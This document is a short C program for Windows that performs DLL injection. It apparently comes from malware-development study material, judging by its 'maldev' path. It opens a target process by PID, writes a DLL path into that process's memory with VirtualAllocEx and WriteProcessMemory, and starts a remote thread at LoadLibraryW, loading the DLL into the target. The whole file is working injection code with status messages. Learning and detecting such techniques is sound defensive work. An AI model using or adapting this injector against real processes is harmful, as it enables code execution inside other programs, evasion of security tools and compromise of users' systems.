#include <stdio.h>
#include <windows.h>

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

int main(int argc, char* argv[]) {

	LPVOID rBuffer = NULL;
	HMODULE hKernel32 = NULL;
	DWORD PID = NULL, TID = NULL;
	HANDLE hProcess = NULL, hThread = NULL;

	wchar_t dllPath[MAX_PATH] = L"C:\\Users\\Bruce\\Documents\\maldev\\example.dll";
	size_t dllPathSize = sizeof(dllPath);

	if (argc < 2) {
		printf("%s usage: %s <PID>", e, argv[0]);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);

	printf("%s trying to get a handle to the process (%ld)\n", i, PID);
	
	/* get a handle to the process */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL) {
		printf("%s unable to get a handle to the process, error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the process\n\t\\---0x%p\n", k, hProcess);

	/* allocate to the process memory */
	rBuffer = VirtualAllocEx(hProcess, rBuffer, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	printf("%s allocated rBuffer with PAGE_READWRITE permissions\n", k, dllPath);

	/* write to the process memory */
	WriteProcessMemory(hProcess, rBuffer, (LPVOID)dllPath, dllPathSize, NULL);
	printf("%s wrote [%S] to the process memory\n", k, dllPath);

	/* get a handle to Kernel32 */
	hKernel32 = GetModuleHandleW(L"Kernel32");

	if (hKernel32 == NULL) {
		printf("%s failed to get a handle to Kernel32.dll, error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to Kernel32.dll\n\t\\---0x%p\n", k, hKernel32);

	/* get the address of LoadLibraryW() from Kernel32 */
	LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	printf("%s got address of LoadLibraryW()\n\t\\---0x%p\n", k, startThis);

	/* create thread */
	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);

	if (hThread == NULL) {
		printf("%s unable to create thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	/* exit cleanly */
	printf("%s got a handle to the newly created thread (%ld)\n\t\\---0x%p\n", k, TID, hThread);
	printf("%s waiting for thread to finish execution\n", i);

	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished execution, cleaning up...\n", k);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	printf("%s finished, see you next time :>", k);
	return EXIT_SUCCESS;

}
